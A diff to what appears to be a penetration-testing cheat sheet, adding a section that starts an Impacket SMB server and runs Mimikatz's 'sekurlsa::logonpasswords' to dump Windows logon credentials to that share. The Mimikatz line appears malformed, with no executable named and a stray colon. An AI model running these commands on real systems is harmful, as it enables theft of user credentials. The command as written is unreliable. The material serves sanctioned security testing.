@@ -518,6 +518,21 @@ grep -i <keyword> *
 </details> 
 
 <details>
+  <summary> Run Mimikatz from impackets smb share </summary> 
+
+  ### Starting a SMB Server
+  ```bash
+  impacket-smbserver.py <shareName> <sharePath>
+  ```
+  
+  ### Run Mimikatz from host and write output to the share
+  ```bash
+  \\<target_IP>\<shareName> "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
+  ```
+  
+</details> 
+
+<details>
   <summary> linWinPwn </summary> 
   
 ### With administrator Account (using password, NTLM hash or Kerberos ticket)
